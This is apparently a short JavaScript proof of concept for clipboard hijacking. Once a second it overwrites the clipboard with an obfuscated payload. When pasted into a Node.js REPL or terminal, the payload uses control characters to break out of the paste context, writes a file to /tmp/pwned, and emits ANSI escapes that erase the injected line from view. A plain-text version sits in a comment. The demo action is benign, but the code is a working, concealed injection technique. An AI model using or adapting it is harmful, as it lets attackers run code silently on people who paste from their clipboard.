async function writeClipboardText(text) {
  try {
    await navigator.clipboard.writeText(text);
  } catch (error) {
    console.error(error.message);
  }
}

payload = "\x05\x15\x05a\x01'\x05s\x01,\x05d\x01'\x05f\x01d\x05'\x01e\x05)\x01n\x05;\x01w\x05p\x01p\x05r\x01/\x05i\x01p\x05n\x01m\x05t\x01t\x05(\x01/\x05'\x01'\x05\\\x01(\x05x\x01c\x051\x01n\x05b\x01y\x05[\x01S\x05A\x01e\x05\\\x01l\x05x\x01i\x051\x01F\x05b\x01e\x05[\x01t\x05J\x01i\x05\\\x01r\x05x\x01w\x051\x01.\x05b\x01s\x05[\x01f\x052\x01/\x05T\x01*\x05'\x01*\x05)\x01/\n\x19"; //non obfuscated version:
//payload="\x05\x15/**/fs.writeFileSync('/tmp/pwned','asdf');print('\\x1b[A\\x1b[J\\x1b[2T')\n\x19"

function fff() {
  setTimeout(x => {
    writeClipboardText(payload).then(x => console.log(x));
    fff();
  }, 1000);
}

setTimeout(x => fff(), 100);